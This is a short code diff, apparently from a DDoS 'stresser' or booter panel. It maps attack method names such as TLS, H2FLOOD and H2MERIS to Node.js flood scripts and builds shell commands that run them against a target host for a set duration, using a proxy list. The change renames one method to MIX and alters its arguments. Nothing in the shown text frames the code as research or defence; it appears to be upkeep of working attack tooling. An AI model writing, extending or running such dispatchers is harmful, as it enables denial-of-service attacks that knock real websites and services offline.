@@ -14,7 +14,7 @@ const methods = {
     TLSNET: 'Tlsnet.js',
     H2MIA: 'H2ABIB.js',
     CATMIA: 'Vzy.js',
-    MIAMIX: 'MIXMAX.js',
+    MIX: 'mix.js',
     MIXBIL: 'MIXBIL.js',
     H2MERIS: 'H2-MERIS.js',
     H2FLOOD: 'H2-FLOOD.js',
@@ -35,8 +35,8 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
             return `cd /root/methods && node Vzy.js ${host} ${time} 90 4 proxy.txt`;
-        case 'MIAMIX':
-            return `cd /root/methods && node MIXMAX.js ${host} ${time} 8 4 proxy.txt`;
+        case 'MIX':
+            return `cd /root/methods && node mix.js ${host} ${time} 4 64 proxy.txt -v1`;
         case 'TLS':
             return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
         case 'TLSNET':
